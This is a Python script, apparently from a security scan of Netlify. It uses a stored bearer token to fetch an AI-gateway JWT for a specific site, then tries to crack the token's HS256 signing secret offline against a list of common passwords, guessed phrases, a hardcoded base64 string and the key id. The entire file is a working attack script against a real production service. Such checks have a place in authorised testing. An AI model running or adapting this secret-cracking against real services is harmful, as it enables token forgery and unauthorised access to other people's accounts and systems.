# -*- coding: utf-8 -*-
"""NL22: ai-gateway JWT HS256 weak-secret check (local verify, no requests)"""
import http.client, ssl, json, sys, hmac, hashlib, base64, itertools
sys.path.insert(0, r'F:\scan\netlify_report')
from _net_creds import TOKEN_B

ctx = ssl.create_default_context()
SITE_B_ID = 'd2977de0-d24d-4544-81cb-933e610cad7d'


def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def verify(token, secret):
    parts = token.split(".")
    if len(parts) != 3:
        return False
    sig = b64d(parts[2])
    exp = hmac.new(secret.encode() if isinstance(secret, str) else secret,
                   (parts[0] + "." + parts[1]).encode(), hashlib.sha256).digest()
    return hmac.compare_digest(sig, exp)


def main():
    print("== NL22 ==", flush=True)
    conn = http.client.HTTPSConnection("api.netlify.com", timeout=30, context=ctx)
    conn.request("GET", "/api/v1/sites/%s/ai-gateway/token" % SITE_B_ID,
                 headers={"Authorization": "Bearer " + TOKEN_B,
                          "User-Agent": "Mozilla/5.0 Chrome/126.0",
                          "Accept": "application/json"})
    r = conn.getresponse()
    raw = r.read()
    print("token resp [%d] %s" % (r.status, raw[:150]), flush=True)
    tok = json.loads(raw).get("token")
    conn.close()
    header = json.loads(b64d(tok.split(".")[0]))
    claims = json.loads(b64d(tok.split(".")[1]))
    print("header:", header, flush=True)
    print("claims:", {k: v for k, v in claims.items()}, flush=True)
    candidates = ["netlify", "netlify-ai", "netlify-ai-gateway", "secret", "secretkey", "password",
                  "changeme", "ai-gateway", "aigateway", "netlifyai", "nf-ai", "ai", "key", "keyboard",
                  "123456", "12345678", "qwerty", "admin", "letmein", "welcome", "monkey", "dragon",
                  "master", "sunshine", "princess", "football", "iloveyou", "000000", "111111",
                  "netlify.com", "B0B+i06A+EqmPXwM03B5qUS70VtwxGoHYZkFV7cYJM4",
                  "MIIB", "jwt-secret", "JWT_SECRET", "hmac", "signing-key", "signingkey",
                  "test", "testing", "dev", "development", "prod", "production", "gateway"]
    # also derive from kid? kid is base64 of 32 bytes - try as raw key
    try:
        kid_raw = b64d(header.get("kid", ""))
        candidates.append(kid_raw)
    except Exception:
        pass
    hit = []
    for c in candidates:
        if verify(tok, c):
            hit.append(c)
    print("secret hits:", hit if hit else "none", flush=True)
    print("done", flush=True)


if __name__ == "__main__":
    main()
